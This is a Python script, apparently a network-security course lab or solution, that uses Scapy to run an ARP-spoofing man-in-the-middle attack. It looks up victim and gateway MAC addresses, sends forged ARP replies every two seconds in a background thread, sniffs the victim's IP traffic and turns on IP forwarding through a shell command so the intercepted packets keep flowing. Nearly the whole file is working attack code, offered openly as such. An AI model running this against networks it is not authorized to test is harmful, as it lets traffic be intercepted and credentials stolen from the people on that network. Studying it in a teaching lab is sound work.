import scapy
import netifaces
import threading 
import time 
import binascii
import subprocess
from time import sleep
from scapy.all import *

attacker_mac = ""
hackedMachines = []
'''
### Step 1: Setting up everything

To begin with, we need to obtain the MAC addresses of our target devices. This can be achieved using a Python library called Scapy. Scapy is a powerful tool for network manipulation and analysis, allowing us to send, sniff, and dissect network packets. By using Scapy, we can scan the network to discover devices and retrieve their MAC addresses, which are essential for further network-related operations.

It's also important that you know your IP Address
'''


# Part 1 -----------------------------------------------------------------------------------------------------------


"""
Get the MAC address of a device on the local network given its IP address.
Args:
    ip (str): The IP address of the target device.
Returns:
    str: The MAC address of the target device.
"""


# get the mac address by broadcasting ARP to target ip
def getMacAddress(ip)->str:

	target_mac 	= "ff:ff:ff:ff:ff:ff" # broadcast request 
	ether 		= Ether(dst=target_mac)
	arp 		= ARP(pdst=ip) 
	
	packet = ether/arp # form packet
	
	result = srp(packet, timeout=3, verbose=True )[0] # use srp to send and recieve arp rq
	
	# parse out the hardware source
	for sent, received in result:
        	return received.hwsrc
	pass



"""
Get the IP address of the current machine from the available network interfaces.
Returns:
    str: The selected IP address of the current machine.
"""


# Basically on Mac or linux will run ifconfig and parse it for the ipv4 interfaces that are not loopback 
def getOwnIpAddress() -> str:
	ip = []
	result = subprocess.run(["ifconfig"], capture_output=True, text=True) # install net tools or use ip a might need net tools for both commands
	results = str(result).replace("\\n", "\n").split("\n")
	for line in results: 
		if "inet" in line and "inet6" not in line:
			words = line.strip().split(" ")

			for i, word in enumerate(words): 

				if word == "inet":
					ip.append( words[i + 1] )
	if "127.0.0.1" in ip: 
		ip.remove("127.0.0.1")
	if len(ip) > 1 or len(ip) == 0: 
		ip = str(input("Choose your IP by typing it in from the list:"))
	return ip
	
	
	
	
# Part 2 ------------------------------------------------------------------------------------------------------------------------



"""
Sends an ARP spoofing packet to the target IP address, making it believe that the spoof IP address is associated with the attacker's MAC address.
Args:
    targetIp (str): The IP address of the target machine to be spoofed.
    spoofIp (str): The IP address that the target machine should believe is associated with the attacker's MAC address.
Returns:
    None
Raises:
    Exception: If there is an error in sending the ARP packet.
Example:
    spoof("192.168.1.5", "192.168.1.1")
"""




def spoof(targetIp, spoofIp, attacker_mac):
	
	victim_mac 	= getMacAddress(targetIp)
	gateway_mac 	= getMacAddress(spoofIp)
	attacker_mac 	= attacker_mac
	ether 		= Ether(dst=victim_mac, src=attacker_mac) # Ether packet creation
	arp 		= ARP(op=2, pdst=targetIp, psrc=spoofIp, hwdst=victim_mac, hwsrc=attacker_mac ) # ARP creation with op = 2 meaning ARP reply
	
	# Check if targetIP are already in hackedMachines 
	if [targetIp, victim_mac] in hackedMachines:
		pass
	else: 
		hackedMachines.append([targetIp, victim_mac])
		
	packet = ether / arp
	sendp(packet)
	return None



# Part 3 -----------------------------------------------------------------------------------------------------------------------------

"""
Starts the packet sniffer to capture network packets.
This function initiates the sniffing process
It captures packets and processes them to forward packets to the intended destination if it's one of the hacked machines.
Returns: None
"""


def packet_analyzer(packet):
	# We want to intercept and extract: 
	dst_mac 	= ""
	dst_ip 		= ""
	src_mac 	= ""
	src_ip 		= ""
	
	if Ether in packet and IP in packet:
		src_mac = packet[Ether].src
		dst_mac = packet[Ether].dst
		src_ip = packet[IP].src
		dst_ip = packet[IP].dst
	for ipv, macv in hackedMachines:  
		if ipv == dst_ip: 
	   		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Recieved this from Scapy tutorial https://0xbharath.github.io/art-of-packet-crafting-with-scapy/index.html a scapy tutorial
	return None
	
	
def startSniffer():
	a=sniff(filter="ip",prn=packet_analyzer)
	pass
    
    
def main():

    target_ip 		= str(input("Input target ip: ")) # 10.0.0.5 my case my target machine 
    spoof_ip 		= str(input("Input spoof ip: "))  # 10.0.0.1 my case Router/Gateway IP
    global attacker_mac
    attacker_mac 	= str(input("Input Attacker mac: "))
    
    
    print("------------------------------ Test 1 -----------------------------")
    print(f"Get Mac Address: {getMacAddress(target_ip)} for IP {target_ip}")
    print(f"Get Current IP: {getOwnIpAddress()}")
    
    print("------------------------------ Test 2 -----------------------------")
    def continuousSpoof():
        while True:
            spoof(target_ip, spoof_ip, attacker_mac)
            time.sleep(2)  # Sleep for 2 seconds before sending the next spoof packet

    # Start the spoofing thread
    spoof_thread = threading.Thread(target=continuousSpoof)
    spoof_thread.start()

    # Start the packet sniffer thread
    # This thread will run in the background and sniff packets. I do it like this in case students use a blocking solution
    sniffer_thread = threading.Thread(target=startSniffer)
    sniffer_thread.start()

# Run the main function
main()
	